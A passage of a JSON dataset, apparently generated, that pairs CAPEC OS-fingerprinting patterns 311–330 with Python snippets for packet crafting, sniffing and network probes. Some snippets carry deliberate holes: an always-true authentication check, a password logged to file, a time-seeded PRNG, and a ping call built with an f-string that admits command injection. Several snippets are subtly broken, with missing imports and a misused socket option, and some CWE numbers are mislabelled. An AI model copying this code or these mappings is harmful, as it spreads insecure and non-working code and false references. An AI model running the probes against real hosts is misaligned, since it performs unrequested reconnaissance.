        "capec_id": "311",
        "capec_name": "DEPRECATED: OS Fingerprinting",
        "code_snippet": "import os\nimport platform\n\n# Active OS Fingerprinting\n# This script attempts to identify the OS by checking specific system files and commands\n\ndef active_os_fingerprinting():\n    try:\n        if platform.system() == 'Windows':\n            os_version = os.popen('ver').read()\n        else:\n            os_version = os.popen('uname -a').read()\n        return os_version\n    except Exception as e:\n        return str(e)\n\n# Example of a deprecated CWE-592: Authentication Bypass Issue\n# This function simulates an authentication bypass by always returning True\n\ndef deprecated_authentication_bypass():\n    return True\n\n# Example of CWE-534: Information Exposure Through Debug Log Files\n# This function logs sensitive information to a debug file\n\ndef log_sensitive_info():\n    with open('debug.log', 'a') as f:\n        f.write('Sensitive Information: User password is 12345\\n')\n\n# Example of CWE-589: Call to Non-ubiquitous API\n# This function uses a platform-specific API call\n\ndef non_ubiquitous_api_call():\n    if platform.system() == 'Windows':\n        return os.popen('ipconfig').read()\n    else:\n        return os.popen('ifconfig').read()\n\nif __name__ == '__main__':\n    print('OS Fingerprinting Result:', active_os_fingerprinting())\n    print('Authentication Bypass:', deprecated_authentication_bypass())\n    log_sensitive_info()\n    print('Non-ubiquitous API Call Result:', non_ubiquitous_api_call())",
        "description": "This Python code snippet demonstrates the concept of OS Fingerprinting (CAPEC-312: Active OS Fingerprinting) by attempting to identify the operating system through system commands. It also includes examples of deprecated and related CWEs for additional context:\n\n1. **CWE-592: Authentication Bypass Issue** - A function that simulates an authentication bypass by always returning True.\n2. **CWE-534: Information Exposure Through Debug Log Files** - A function that logs sensitive information to a debug file.\n3. **CWE-589: Call to Non-ubiquitous API** - A function that uses platform-specific API calls, which may not be available on all systems.\n\nThe main idea is to show how OS fingerprinting can be performed actively and to highlight potential security issues related to deprecated and related CWEs."
    },
    {
        "capec_id": "312",
        "capec_name": "Active OS Fingerprinting",
        "code_snippet": "import socket\n\n# Function to send a crafted packet to a target and receive the response\ndef os_fingerprinting(target_ip, target_port):\n    # Create a raw socket\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    \n    # Craft a TCP packet with unusual flags/settings\n    packet = b'\\x45\\x00\\x00\\x3c\\x1c\\x46\\x40\\x00\\x40\\x06\\xb1\\xe6\\xac\\x10\\x0a\\x63\\xac\\x10\\x0a\\x0c'\n    \n    # Send the packet to the target\n    sock.sendto(packet, (target_ip, target_port))\n    \n    # Receive the response\n    response = sock.recv(1024)\n    \n    # Analyze the response to determine the OS\n    if response:\n        print(f'Response from {target_ip}: {response}')\n        # Here you would add logic to analyze the response and determine the OS\n    else:\n        print(f'No response from {target_ip}')\n\n# Example usage\nos_fingerprinting('192.168.1.1', 80)",
        "description": "This Python code snippet demonstrates a basic form of active OS fingerprinting. It creates a raw socket and sends a crafted TCP packet with unusual flags/settings to a target IP address and port. The response from the target is then received and printed. The unique response to the crafted packet can be analyzed to determine the operating system of the target. This code embodies the main idea of CAPEC-312 (Active OS Fingerprinting) by probing a target to reveal information about its operating system. The related CWEs are represented by the exposure of sensitive information (CWE-200, CWE-497) through the target's response, and the observable behavioral discrepancy (CWE-207) in how different operating systems respond to the crafted packet."
    },
    {
        "capec_id": "313",
        "capec_name": "Passive OS Fingerprinting",
        "code_snippet": "import socket\nimport struct\nimport os\n\n# Function to passively capture packets\ndef capture_packets(interface):\n    # Create a raw socket to capture packets\n    raw_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))\n    raw_socket.bind((interface, 0))\n    \n    while True:\n        packet = raw_socket.recvfrom(65565)[0]\n        ip_header = packet[14:34]\n        ip_hdr = struct.unpack('!BBHHHBBH4s4s', ip_header)\n        ttl = ip_hdr[5]\n        src_ip = socket.inet_ntoa(ip_hdr[8])\n        \n        # Log the captured packet details\n        print(f'Source IP: {src_ip}, TTL: {ttl}')\n        \n        # Example of sensitive information exposure\n        if ttl == 64:\n            os_version = 'Linux'\n        elif ttl == 128:\n            os_version = 'Windows'\n        else:\n            os_version = 'Unknown'\n        \n        print(f'Detected OS: {os_version}')\n\n# Example usage\ncapture_packets('eth0')",
        "description": "This Python code snippet demonstrates passive OS fingerprinting by capturing network packets on a specified interface and analyzing the Time-To-Live (TTL) value in the IP header to infer the operating system of the source device. The code creates a raw socket to capture packets and extracts the TTL value from the IP header. Based on the TTL value, it guesses the OS (e.g., 64 for Linux, 128 for Windows). This process embodies the CAPEC concept of passive OS fingerprinting by monitoring network communication without sending probes. The code also highlights related CWEs, such as the exposure of sensitive information (CWE-200, CWE-497) and cleartext transmission (CWE-319), as it prints out potentially sensitive OS information based on observed network traffic."
    },
    {
        "capec_id": "314",
        "capec_name": "DEPRECATED: IP Fingerprinting Probes",
        "code_snippet": "import socket\nimport logging\n\n# CWE-532: Information Exposure Through Debug Log Files\nlogging.basicConfig(filename='debug.log', level=logging.DEBUG)\n\n# CWE-287: Authentication Bypass Issues\n# CWE-350: Reliance on DNS Lookups in a Security Decision\n# CWE-312: Active OS Fingerprinting\n\ndef os_fingerprinting(ip):\n    try:\n        # Create a raw socket\n        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)\n        s.connect((ip, 80))\n        s.send(b'\\x00' * 40)  # Send a dummy packet\n        response = s.recv(1024)\n        logging.debug(f'Received response: {response}')\n        return response\n    except Exception as e:\n        logging.error(f'Error: {e}')\n        return None\n\n# Example usage\nip_address = '192.168.1.1'\nresponse = os_fingerprinting(ip_address)\nif response:\n    print(f'OS Fingerprinting response: {response}')\nelse:\n    print('Failed to fingerprint OS')",
        "description": "This Python code snippet demonstrates a basic example of active OS fingerprinting (CAPEC-312) by sending a dummy packet to a target IP address and logging the response. The code also highlights several deprecated CWEs: CWE-532 (logging sensitive information to a debug log file), CWE-287 (potential for authentication bypass), and CWE-350 (reliance on DNS lookups in a security decision). The code creates a raw socket, sends a dummy packet, and logs the response, which could be used to infer the operating system of the target machine. This approach can be exploited by attackers to gather information about the target system."
    },
    {
        "capec_id": "315",
        "capec_name": "DEPRECATED: TCP/IP Fingerprinting Probes",
        "code_snippet": "import socket\nimport os\n\n# Vulnerable function to demonstrate TCP/IP fingerprinting and authentication bypass\n\ndef vulnerable_function(ip, port):\n    try:\n        # Create a socket connection\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((ip, port))\n\n        # Send a probe to identify the OS (TCP/IP Fingerprinting)\n        s.send(b'\\x00\\x00\\x00\\x00')\n        response = s.recv(1024)\n        print(f'Response: {response}')\n\n        # Simulate an authentication process\n        auth_token = os.urandom(16)\n        s.send(auth_token)\n        auth_response = s.recv(1024)\n        print(f'Auth Response: {auth_response}')\n\n        # Vulnerable to replay attack\n        s.send(auth_token)  # Replay the same token\n        replay_response = s.recv(1024)\n        print(f'Replay Response: {replay_response}')\n\n    except Exception as e:\n        print(f'Error: {e}')\n    finally:\n        s.close()\n\n# Example usage\nvulnerable_function('192.168.1.1', 8080)",
        "description": "This Python code snippet demonstrates a vulnerable function that embodies the main idea of CAPEC-312 (Active OS Fingerprinting) and related CWEs, particularly CWE-294 (Authentication Bypass by Capture-replay). The function establishes a TCP connection to a given IP and port, sends a probe to identify the OS (TCP/IP Fingerprinting), and simulates an authentication process using a randomly generated token. The same token is then replayed to demonstrate a capture-replay vulnerability. This code highlights the risks associated with TCP/IP fingerprinting and the potential for authentication bypass through replay attacks."
    },
    {
        "capec_id": "316",
        "capec_name": "DEPRECATED: ICMP Fingerprinting Probes",
        "code_snippet": "import os\nimport socket\n\n# Vulnerable function to determine OS type using ICMP fingerprinting\n# This is a simplified example and should not be used in production\n\ndef get_os_type(ip_address):\n    try:\n        # Send an ICMP echo request (ping) to the target IP address\n        response = os.system(f'ping -c 1 {ip_address}')\n        if response == 0:\n            return 'Host is up, OS fingerprinting possible'\n        else:\n            return 'Host is down or not reachable'\n    except Exception as e:\n        return f'Error: {e}'\n\n# Example usage\nip = '192.168.1.1'\nos_type = get_os_type(ip)\nprint(f'OS Type: {os_type}')\n\n# CWE-287: Authentication Bypass Issue\n# This code does not perform any authentication checks before attempting to fingerprint the OS\n# CWE-532: Information Exposure Through Debug Log Files\n# If debug logging were added, sensitive information could be exposed\n# CWE-1316: Overlapping protected and unprotected regions\n# Not directly applicable in this context but could be relevant in a broader system design\n# CWE-319: Sensitive Information Accessible by Physical Probing\n# Not directly applicable in this context but relevant for hardware-level security\n# CWE-350: Reliance on DNS Lookups in a Security Decision\n# This code does not rely on DNS lookups, but if it did, it could be vulnerable to DNS spoofing",
        "description": "This Python code snippet demonstrates a simplified example of ICMP fingerprinting to determine the OS type of a target machine. The function `get_os_type` sends an ICMP echo request (ping) to the specified IP address and checks the response to infer whether the host is up and potentially fingerprintable. This embodies the main idea of CAPEC-312: Active OS Fingerprinting. The code also highlights several related CWEs: it lacks authentication checks (CWE-287), could expose sensitive information if debug logging were added (CWE-532), and while not directly applicable, mentions potential issues with overlapping protected and unprotected regions (CWE-1316) and physical probing (CWE-319). Additionally, it notes the absence of DNS lookups, which could introduce vulnerabilities (CWE-350)."
    },
    {
        "capec_id": "317",
        "capec_name": "IP ID Sequencing Probe",
        "code_snippet": "import socket\nimport time\n\ndef analyze_ip_id_sequence(target_ip):\n    ip_ids = []\n    for _ in range(5):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n        sock.sendto(b'\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00', (target_ip, 0))\n        response = sock.recv(1024)\n        ip_id = int.from_bytes(response[4:6], 'big')\n        ip_ids.append(ip_id)\n        time.sleep(1)\n    return ip_ids\n\nif __name__ == '__main__':\n    target_ip = '192.168.1.1'\n    ip_id_sequence = analyze_ip_id_sequence(target_ip)\n    print(f'IP ID sequence for {target_ip}: {ip_id_sequence}')",
        "description": "This Python code snippet demonstrates a basic IP ID sequencing probe, which is used to analyze the IP 'ID' field sequence number generation algorithm of a remote host. The code sends ICMP echo requests to the target IP address and captures the IP ID values from the responses. By examining the sequence of these IP ID values, an attacker can infer the operating system of the target host. This technique leverages the fact that different operating systems generate IP ID numbers differently. The code also touches on CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it exposes the IP ID sequence, which can be considered sensitive information. Additionally, it indirectly relates to CWE-291 (Reliance on IP Address for Authentication) as it demonstrates how IP-based information can be probed and potentially misused."
    },
    {
        "capec_id": "318",
        "capec_name": "IP 'ID' Echoed Byte-Order Probe",
        "code_snippet": "import socket\n\n# Function to send a UDP packet with a specific IP ID\ndef send_udp_probe(target_ip, target_port, ip_id):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n    packet = b'\\x45\\x00\\x00\\x1c' + ip_id.to_bytes(2, 'big') + b'\\x00\\x00\\x40\\x11\\x00\\x00' + socket.inet_aton('192.168.1.1') + socket.inet_aton(target_ip) + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00'\n    sock.sendto(packet, (target_ip, target_port))\n\n# Function to receive ICMP error message\ndef receive_icmp_response():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    response, _ = sock.recvfrom(1024)\n    return response\n\n# Main function to perform the IP 'ID' Echoed Byte-Order Probe\ndef ip_id_echo_probe(target_ip, target_port):\n    ip_id = 12345  # Arbitrary IP ID value\n    send_udp_probe(target_ip, target_port, ip_id)\n    response = receive_icmp_response()\n    echoed_ip_id = response[24:26]  # Extract echoed IP ID from ICMP response\n    if echoed_ip_id == ip_id.to_bytes(2, 'big'):\n        print(f\"Target {target_ip} echoes IP ID correctly.\")\n    else:\n        print(f\"Target {target_ip} does not echo IP ID correctly.\")\n\n# Example usage\nip_id_echo_probe('192.168.1.100', 12345)",
        "description": "This Python code snippet demonstrates an IP 'ID' Echoed Byte-Order Probe, which is used for OS fingerprinting. The code sends a UDP packet with a specific IP ID to a closed port on a target host and then listens for an ICMP error message in response. The IP ID from the response is checked to see if it matches the sent IP ID, indicating whether the target host echoes the IP ID correctly. This behavior can help identify the operating system or router firmware of the target. The code also touches on related CWEs by demonstrating how sensitive information (IP ID) can be exposed and potentially mismanaged."
    },
    {
        "capec_id": "319",
        "capec_name": "IP (DF) 'Don't Fragment Bit' Echoing Probe",
        "code_snippet": "import socket\n\n# Function to send a UDP packet with the DF bit set\ndef send_udp_packet_with_df(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)\n        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n        # Construct IP header with DF bit set\n        ip_header = b'\\x45\\x00\\x00\\x1c\\x00\\x01\\x40\\x00\\x40\\x11\\x00\\x00'  # Version, IHL, Type of Service, Total Length, ID, Flags (DF), Fragment Offset, TTL, Protocol, Header Checksum\n        ip_header += socket.inet_aton('192.168.1.1')  # Source IP (example)\n        ip_header += socket.inet_aton(target_ip)  # Destination IP\n\n        # Construct UDP header\n        udp_header = b'\\x00\\x35'  # Source Port (example)\n        udp_header += target_port.to_bytes(2, 'big')  # Destination Port\n        udp_header += b'\\x00\\x08\\x00\\x00'  # Length, Checksum\n\n        # Send the packet\n        sock.sendto(ip_header + udp_header, (target_ip, target_port))\n        print(f\"Packet sent to {target_ip}:{target_port}\")\n    except Exception as e:\n        print(f\"Error: {e}\")\n\n# Example usage\nsend_udp_packet_with_df('192.168.1.2', 12345)",
        "description": "This Python code snippet demonstrates how to send a UDP packet with the 'Don't Fragment' (DF) bit set in the IP header to a specified target IP and port. The code creates a raw socket and constructs an IP header with the DF bit set, followed by a UDP header. The packet is then sent to the target. This mimics the CAPEC scenario where an attacker sends a UDP datagram with the DF bit set to observe the response from the target system. The code also highlights potential security weaknesses such as exposure of sensitive information (CWE-200) and incorrectly specified destinations (CWE-941)."
    },
    {
        "capec_id": "320",
        "capec_name": "TCP Timestamp Probe",
        "code_snippet": "import socket\nimport struct\n\n# Function to extract TCP timestamp from a TCP packet\ndef extract_tcp_timestamp(packet):\n    # TCP header starts after the IP header (20 bytes for IPv4)\n    tcp_header = packet[20:40]\n    # Unpack the TCP header\n    tcp_fields = struct.unpack('!HHLLBBHHH', tcp_header)\n    # Extract TCP options (assuming no IP options, so options start at byte 20)\n    tcp_options = packet[40:60]\n    # Check for TCP timestamp option (kind=8, length=10)\n    if tcp_options[0] == 8 and tcp_options[1] == 10:\n        # Extract the timestamp value\n        ts_val = struct.unpack('!L', tcp_options[2:6])[0]\n        return ts_val\n    return None\n\n# Create a raw socket to capture packets\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\nsock.bind(('0.0.0.0', 0))\nsock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\nprint('Listening for TCP packets...')\n\nwhile True:\n    packet, addr = sock.recvfrom(65535)\n    ts_val = extract_tcp_timestamp(packet)\n    if ts_val:\n        print(f'Received TCP timestamp from {addr[0]}: {ts_val}')",
        "description": "This Python code snippet demonstrates how to capture and extract TCP timestamps from network packets. It creates a raw socket to listen for incoming TCP packets and then extracts the TCP timestamp option from the TCP header if present. The extracted timestamp can be used to infer the operating system of the remote server based on the timestamp values and intervals, which is the main idea of the 'TCP Timestamp Probe' CAPEC. The code also touches on related CWEs such as 'Exposure of Sensitive Information to an Unauthorized Actor' (CWE-200) by exposing timestamp information, and 'Cleartext Transmission of Sensitive Information' (CWE-319) since the timestamps are transmitted in cleartext."
    },
    {
        "capec_id": "321",
        "capec_name": "TCP Sequence Number Probe",
        "code_snippet": "import socket\nimport time\n\n# Function to generate a predictable sequence number\n# CWE-337: Predictable Seed in Pseudo-Random Number Generator (PRNG)\ndef generate_sequence_number(ack_number):\n    seed = int(time.time())  # Predictable seed based on system time\n    return (ack_number + seed) % 4294967296  # Simple predictable sequence number generation\n\n# Function to simulate TCP sequence number probe\n# CWE-319: Cleartext Transmission of Sensitive Information\ndef tcp_sequence_probe(target_ip, target_port):\n    try:\n        # Create a socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect((target_ip, target_port))\n\n        # Send a probe packet (SYN)\n        sock.send(b'SYN')\n\n        # Receive the response (SYN-ACK)\n        response = sock.recv(1024)\n        ack_number = int.from_bytes(response[:4], 'big')  # Extracting ACK number from response\n\n        # Generate sequence number based on ACK number\n        sequence_number = generate_sequence_number(ack_number)\n\n        print(f\"Generated Sequence Number: {sequence_number}\")\n\n        sock.close()\n    except Exception as e:\n        print(f\"Error: {e}\")\n\n# Example usage\ntarget_ip = '192.168.1.1'\ntarget_port = 80\ntcp_sequence_probe(target_ip, target_port)",
        "description": "This Python code snippet demonstrates a TCP sequence number probe, which is used for OS fingerprinting by analyzing how a target system generates TCP sequence numbers. The function `generate_sequence_number` uses a predictable seed (system time) to generate a sequence number, illustrating CWE-337 (Predictable Seed in PRNG). The `tcp_sequence_probe` function sends a SYN packet to a target IP and port, receives a SYN-ACK response, and extracts the acknowledgment number. It then generates a sequence number based on this acknowledgment number. This process can help identify the target's OS based on its sequence number generation pattern. The code also transmits data in cleartext, highlighting CWE-319 (Cleartext Transmission of Sensitive Information)."
    },
    {
        "capec_id": "322",
        "capec_name": "TCP (ISN) Greatest Common Divisor Probe",
        "code_snippet": "import socket\nimport struct\nimport time\n\n# Function to create a raw socket and send TCP SYN packets\ndef send_syn_packets(target_ip, target_port, count=10):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    for _ in range(count):\n        # Construct TCP SYN packet\n        packet = struct.pack('!HHLLBBHHH', 1234, target_port, 0, 0, 80, 2, 8192, 0, 0)\n        sock.sendto(packet, (target_ip, target_port))\n        time.sleep(1)\n\n# Function to capture and analyze SYN/ACK responses\ndef capture_syn_ack_responses(target_ip, count=10):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    isn_values = []\n    for _ in range(count):\n        packet, _ = sock.recvfrom(65535)\n        ip_header = packet[0:20]\n        tcp_header = packet[20:40]\n        src_ip = socket.inet_ntoa(ip_header[12:16])\n        if src_ip == target_ip:\n            isn = struct.unpack('!L', tcp_header[4:8])[0]\n            isn_values.append(isn)\n    return isn_values\n\n# Main function to perform OS fingerprinting\ndef os_fingerprinting(target_ip, target_port):\n    send_syn_packets(target_ip, target_port)\n    isn_values = capture_syn_ack_responses(target_ip)\n    gcd = isn_values[0]\n    for isn in isn_values[1:]:\n        gcd = math.gcd(gcd, isn)\n    print(f'GCD of ISNs: {gcd}')\n    # Compare GCD with known OS behaviors (not implemented)\n\n# Example usage\nos_fingerprinting('192.168.1.1', 80)",
        "description": "This Python code snippet demonstrates a simplified version of the 'TCP (ISN) Greatest Common Divisor Probe' attack. It sends multiple TCP SYN packets to a target IP and port, captures the SYN/ACK responses, and extracts the Initial Sequence Numbers (ISNs) from these responses. The ISNs are then analyzed to determine their Greatest Common Divisor (GCD), which can be used to infer the operating system of the target machine. This process leverages the fact that different operating systems increment ISNs using different values. The code also highlights potential vulnerabilities such as exposure of sensitive information (CWE-200, CWE-497) and cleartext transmission (CWE-319)."
    },
    {
        "capec_id": "323",
        "capec_name": "TCP (ISN) Counter Rate Probe",
        "code_snippet": "import time\nimport random\n\nclass TCPConnection:\n    def __init__(self):\n        self.isn = random.randint(0, 2**32 - 1)\n        self.last_time = time.time()\n\n    def get_isn(self):\n        current_time = time.time()\n        time_diff = current_time - self.last_time\n        self.isn += int(time_diff * 1000)  # Increment ISN based on time\n        self.last_time = current_time\n        return self.isn\n\n# Simulate multiple ISN requests to observe the pattern\nconn = TCPConnection()\nfor _ in range(10):\n    time.sleep(random.uniform(0.1, 0.5))  # Random sleep to simulate time passing\n    print(conn.get_isn())",
        "description": "This Python code snippet simulates the generation of TCP Initial Sequence Numbers (ISNs) based on a time-based algorithm. The `TCPConnection` class initializes an ISN and updates it based on the elapsed time since the last request. The `get_isn` method calculates the time difference and increments the ISN accordingly. This simulates the behavior described in the CAPEC, where the ISN increments can be measured over time to infer information about the system. The code also highlights potential vulnerabilities related to CWE-385 (Covert Timing Channel) and CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by demonstrating how timing information can be used to predict ISN values."
    },
    {
        "capec_id": "324",
        "capec_name": "TCP (ISN) Sequence Predictability Probe",
        "code_snippet": "import time\nimport random\n\n# Vulnerable PRNG using predictable seed\nclass PredictablePRNG:\n    def __init__(self):\n        # Using current time as seed, which is predictable\n        self.seed = int(time.time())\n        random.seed(self.seed)\n\n    def get_sequence_number(self):\n        # Generate a pseudo-random sequence number\n        return random.randint(0, 2**32 - 1)\n\n# Simulate TCP ISN generation\nprng = PredictablePRNG()\nsequence_number = prng.get_sequence_number()\nprint(f\"Generated TCP ISN: {sequence_number}\")\n\n# Exposing sensitive information\nprint(f\"Seed used for PRNG: {prng.seed}\")",
        "description": "This Python code snippet demonstrates a vulnerable implementation of a TCP Initial Sequence Number (ISN) generator using a predictable pseudo-random number generator (PRNG). The PRNG is seeded with the current time, which is predictable (CWE-337). The generated sequence number can be easily predicted by an attacker who knows the seed. Additionally, the seed is exposed, representing an exposure of sensitive information (CWE-200). This code embodies the main idea of the CAPEC 'TCP (ISN) Sequence Predictability Probe' by showing how an attacker could predict the sequence numbers used in TCP connections, potentially leading to session hijacking or other attacks."
    },
    {
        "capec_id": "325",
        "capec_name": "TCP Congestion Control Flag (ECN) Probe",
        "code_snippet": "import socket\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n\n# Construct a TCP packet with ECN flags set\nip_header = b'\\x45\\x00\\x00\\x28\\xab\\xcd\\x00\\x00\\x40\\x06\\x00\\x00'  # Simplified IP header\nsrc_ip = socket.inet_aton('192.168.1.100')\ndst_ip = socket.inet_aton('192.168.1.1')\ntcp_header = b'\\x00\\x50\\x00\\x50\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x50\\x02\\x71\\x10\\x00\\x00\\x00\\x00'  # Simplified TCP header with ECN flags\npacket = ip_header + src_ip + dst_ip + tcp_header\n\n# Send the packet\nsock.sendto(packet, ('192.168.1.1', 0))\n\n# Receive the response\nresponse = sock.recv(1024)\n\n# Check for ECN support in the response\nif response[33] & 0x03:  # Check ECN flags in the TCP header\n    print('ECN supported')\nelse:\n    print('ECN not supported')",
        "description": "This Python code snippet demonstrates a TCP Congestion Control Flag (ECN) probe, which is used to check if a remote host supports Explicit Congestion Notification (ECN) messaging. The code creates a raw socket and constructs a TCP packet with ECN flags set. It then sends this packet to a target IP address and waits for a response. By examining the ECN flags in the response, the code determines if the remote host supports ECN. This probe can be used for OS fingerprinting, as different operating systems may respond differently to ECN flags. The code also highlights potential vulnerabilities such as exposure of sensitive information (CWE-200), improper protection for outbound error messages (CWE-1320), and cleartext transmission of sensitive information (CWE-319)."
    },
    {
        "capec_id": "326",
        "capec_name": "TCP Initial Window Size Probe",
        "code_snippet": "import socket\n\n# Function to establish a TCP connection and check the initial window size\ndef check_initial_window_size(target_ip, target_port):\n    try:\n        # Create a socket object\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        \n        # Connect to the target IP and port\n        s.connect((target_ip, target_port))\n        \n        # Get the initial window size\n        initial_window_size = s.getsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF)\n        \n        print(f'Initial TCP Window Size: {initial_window_size}')\n        \n        # Close the socket\n        s.close()\n    except Exception as e:\n        print(f'Error: {e}')\n\n# Example usage\ncheck_initial_window_size('192.168.1.1', 80)",
        "description": "This Python code snippet demonstrates how to establish a TCP connection to a target IP and port, and then retrieve the initial TCP window size. The function `check_initial_window_size` creates a socket, connects to the specified target, and uses the `getsockopt` method to obtain the initial window size. This value is then printed out. The code embodies the main idea of the CAPEC 'TCP Initial Window Size Probe' by showing how to probe the initial TCP window size, which can be used for OS fingerprinting. The related CWEs provide context on potential vulnerabilities, such as exposure of sensitive information (CWE-200) and reliance on data/memory layout (CWE-188), which can be exploited through such probing techniques."
    },
    {
        "capec_id": "327",
        "capec_name": "TCP Options Probe",
        "code_snippet": "import socket\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n\n# Bind the socket to a specific interface and port\nsock.bind(('0.0.0.0', 0))\n\n# Enable IP_HDRINCL to include IP headers\nsock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n# Function to parse TCP options\ndef parse_tcp_options(tcp_header):\n    options = []\n    offset = (tcp_header[12] >> 4) * 4\n    if offset > 20:\n        options_data = tcp_header[20:offset]\n        while options_data:\n            kind = options_data[0]\n            if kind == 0:  # End of options list\n                break\n            elif kind == 1:  # No-Operation\n                options.append('NOP')\n                options_data = options_data[1:]\n            else:\n                length = options_data[1]\n                options.append(options_data[:length])\n                options_data = options_data[length:]\n    return options\n\n# Function to receive and analyze TCP packets\ndef receive_and_analyze():\n    while True:\n        packet, addr = sock.recvfrom(65535)\n        ip_header = packet[:20]\n        tcp_header = packet[20:40]\n        tcp_options = parse_tcp_options(tcp_header)\n        print(f'Received packet from {addr[0]} with TCP options: {tcp_options}')\n\n# Start receiving and analyzing packets\nreceive_and_analyze()",
        "description": "This Python code snippet creates a raw socket to capture TCP packets and analyze their TCP options. The `parse_tcp_options` function extracts and prints the TCP options from the received packets. This embodies the main idea of the 'TCP Options Probe' CAPEC by examining the type and order of TCP header options in response segments. The code also touches on related CWEs by potentially exposing sensitive information (CWE-200) through the captured packets and making assumptions about the data layout (CWE-188)."
    },
    {
        "capec_id": "328",
        "capec_name": "TCP 'RST' Flag Checksum Probe",
        "code_snippet": "import socket\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n\n# Construct a TCP packet with RST flag and a text payload\nsrc_ip = '192.168.1.2'\ndst_ip = '192.168.1.1'\nsrc_port = 12345\ndst_port = 80\nseq = 0\nack_seq = 0\noffset_res = (5 << 4) + 0\nflags = 0x04  # RST flag\nwindow = socket.htons(5840)\nchecksum = 0\nurg_ptr = 0\n\n# TCP header fields\ntcp_header = struct.pack('!HHLLBBHHH', src_port, dst_port, seq, ack_seq, offset_res, flags, window, checksum, urg_ptr)\n\n# Text payload\npayload = b'Connection reset by peer'\n\n# Calculate checksum (for simplicity, not implemented here)\n# checksum = calculate_checksum(tcp_header + payload)\n\n# Final packet\npacket = tcp_header + payload\n\n# Send the packet\nsock.sendto(packet, (dst_ip, 0))",
        "description": "This Python code snippet demonstrates the creation and sending of a TCP packet with the RST (reset) flag set, including a human-readable text payload. The code uses a raw socket to construct and send the packet, which is a technique that can be used for OS fingerprinting as described in the CAPEC. The related CWEs are represented by the lack of integrity checks (CWE-353, CWE-354), the exposure of potentially sensitive information in cleartext (CWE-319), and the potential for misuse in capture-replay attacks (CWE-294). The code highlights the vulnerability of transmitting sensitive information in cleartext within a reset packet, which can be exploited by unauthorized actors to gather information about the operating system or network configuration."
    },
    {
        "capec_id": "329",
        "capec_name": "ICMP Error Message Quoting Probe",
        "code_snippet": "import socket\n\n# Function to send a UDP packet to a specified host and port\n# and receive an ICMP error message in response\n\ndef send_udp_packet(host, port):\n    try:\n        # Create a UDP socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        sock.settimeout(2)\n\n        # Send a UDP packet to the specified host and port\n        message = b'Test Message'\n        sock.sendto(message, (host, port))\n\n        # Try to receive a response (expecting an ICMP error message)\n        try:\n            data, addr = sock.recvfrom(1024)\n            print(f'Received data: {data} from {addr}')\n        except socket.timeout:\n            print('No response received (expected for closed port)')\n\n    except Exception as e:\n        print(f'Error: {e}')\n    finally:\n        sock.close()\n\n# Example usage\nsend_udp_packet('192.0.2.1', 12345)",
        "description": "This Python code snippet demonstrates a basic implementation of the 'ICMP Error Message Quoting Probe' attack. The function `send_udp_packet` sends a UDP packet to a specified host and port. If the port is closed or unreachable, the target system may generate an ICMP error message (e.g., Port Unreachable). The code attempts to receive this ICMP error message, which may contain quoted data from the original UDP packet. This can potentially expose sensitive information, aligning with CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-211 (Externally-Generated Error Message Containing Sensitive Information). The code is designed to illustrate how an adversary might probe a system to gather information through ICMP error messages."
    },
    {
        "capec_id": "330",
        "capec_name": "ICMP Error Message Echoing Integrity Probe",
        "code_snippet": "import socket\n\n# Function to send an ICMP Echo Request\ndef send_icmp_echo_request(target_ip):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n        sock.settimeout(1)\n\n        # ICMP Echo Request packet\n        packet = b'\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00'  # Type 8 (Echo), Code 0, Checksum 0\n        sock.sendto(packet, (target_ip, 1))\n\n        # Wait for ICMP Error message\n        response, _ = sock.recvfrom(1024)\n        return response\n    except Exception as e:\n        return str(e)\n\n# Target IP address\ntarget_ip = '192.168.1.1'\n\n# Send ICMP Echo Request and receive response\nresponse = send_icmp_echo_request(target_ip)\n\n# Print the response\nprint('Received response:', response)\n\n# Analyze the response for sensitive information\nif b'sensitive_data' in response:\n    print('Sensitive information exposed!')",
        "description": "This Python code snippet demonstrates the concept of generating an ICMP Echo Request to a target IP address and then analyzing the response for sensitive information. The code creates a raw socket to send an ICMP Echo Request packet and waits for an ICMP Error message in response. If the response contains sensitive information, it prints a warning message. This embodies the main idea of the CAPEC 'ICMP Error Message Echoing Integrity Probe' by showing how an adversary might probe a target for sensitive information through ICMP error messages. The related CWEs are represented by the potential exposure of sensitive information in the response and the lack of integrity checks in the transmitted data."
    },
